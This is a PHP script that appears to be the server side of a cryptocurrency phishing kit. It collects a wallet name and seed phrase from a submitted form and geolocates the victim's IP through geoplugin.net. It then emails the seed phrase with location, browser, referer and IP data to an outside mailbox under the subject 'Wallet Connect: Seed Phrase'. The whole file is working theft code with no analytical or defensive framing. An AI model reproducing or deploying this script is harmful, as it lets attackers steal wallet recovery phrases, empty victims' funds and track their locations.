<?php

if(isset($_POST['wallet_name'] ) && isset($_POST['seed'])){

    // Function to get country;
    function ip_visitor_country()
    {
    
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        $country  = "Unknown";
    
        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }
        else
        {
            $ip = $remote;
        }
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://www.geoplugin.net/json.gp?ip=".$ip);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        $ip_data_in = curl_exec($ch); // string
        curl_close($ch);
    
        $ip_data = json_decode($ip_data_in,true);
        $ip_data = str_replace('&quot;', '"', $ip_data); // for PHP 5.2 see stackoverflow.com/questions/3110487/
    
        if($ip_data && $ip_data['geoplugin_countryName'] != null) {
            $country = $ip_data['geoplugin_countryName'];
            
            
        }
    
        return $country;
    }
    
    //echo ip_visitor_country(); // output Country name
    
    
    // Function to get REGION;
    function ip_visitor_region()
    {
    
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        $region  = "Unknown";
    
        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }
        else
        {
            $ip = $remote;
        }
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://www.geoplugin.net/json.gp?ip=".$ip);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        $ip_data_in = curl_exec($ch); // string
        curl_close($ch);
    
        $ip_data = json_decode($ip_data_in,true);
        $ip_data = str_replace('&quot;', '"', $ip_data); // for PHP 5.2 see stackoverflow.com/questions/3110487/
    
        if($ip_data && $ip_data['geoplugin_region'] != null) {
             $region = $ip_data['geoplugin_region'];
            
        }
    
        return $region;
    }
    
    // Function to get city;
    function ip_visitor_city()
    {
    
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        $city  = "Unknown";
    
        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }
        else
        {
            $ip = $remote;
        }
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://www.geoplugin.net/json.gp?ip=".$ip);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        $ip_data_in = curl_exec($ch); // string
        curl_close($ch);
    
        $ip_data = json_decode($ip_data_in,true);
        $ip_data = str_replace('&quot;', '"', $ip_data); // for PHP 5.2 see stackoverflow.com/questions/3110487/
    
        if($ip_data && $ip_data['geoplugin_city'] != null) {
             $city = $ip_data['geoplugin_city'];
            
        }
    
        return $city;
    }
    
  //  echo ip_visitor_city(); // output city name


    $ip = getenv("REMOTE_ADDR");
    $country = ip_visitor_country();
    $region = ip_visitor_region();
    $city = ip_visitor_city();
    $adddate=date("D M d, Y g:i a");
    $message = '';
    $browser = $_SERVER['HTTP_USER_AGENT'];
    $message .= "---------------XR-----------------------\n";
    $message .= "Wallet Name: ".$_POST['wallet_name']."\n";
    $message .= "Seed Phrase: ".$_POST['seed']."\n";
    $message .= "Referer: " .$_SERVER['HTTP_REFERER']."\n";
    $message .= "----------------------LOCATION--------------------------\n";
    $message .= "Country:  ".$country."\n";
    $message .= "Region:  ".$region."\n";
    $message .= "City:  ".$city."\n";
    $message .= "Date:  ".$adddate."\n";
    $message .= "Browser:  ".$browser."\n";
   
    $message .= "IP: ".$ip."\n";
    $message .= "---------------xXRrx-----------------\n";
    
    
    $subject = "Wallet Connect: Seed Phrase $ip $city $region $country";
    $headers = "From: xXRx <noreply>";
    $to ="alexanderkhan48@outlook.com";
    
    if(mail( $to ,  $subject ,  $message )){
        header('Content-Type: application/json');
        echo json_encode('yes');
    }else{
        header('Content-Type: application/json');
        echo json_encode('error');
    }
    
    
}else{
    return json_decode('Not Working!!');
}
?>